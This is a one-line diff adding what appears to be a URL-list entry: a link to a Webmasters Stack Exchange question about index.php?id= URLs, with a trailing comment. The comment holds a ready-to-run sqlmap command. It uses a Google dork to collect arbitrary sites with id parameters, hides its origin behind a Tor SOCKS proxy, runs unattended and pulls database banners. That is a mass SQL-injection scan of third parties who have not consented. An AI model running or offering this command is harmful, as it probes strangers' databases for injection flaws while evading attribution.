@@ -1,0 +1,1 @@
+https://webmasters.stackexchange.com/questions/145069/how-is-a-website-using-url-example-com-index-phpid-for-every-page-storing-an (GET)  # sqlmap.py -g inurl:index.php?id=1 --proxy=socks5://127.0.0.1:9050 --batch --banner
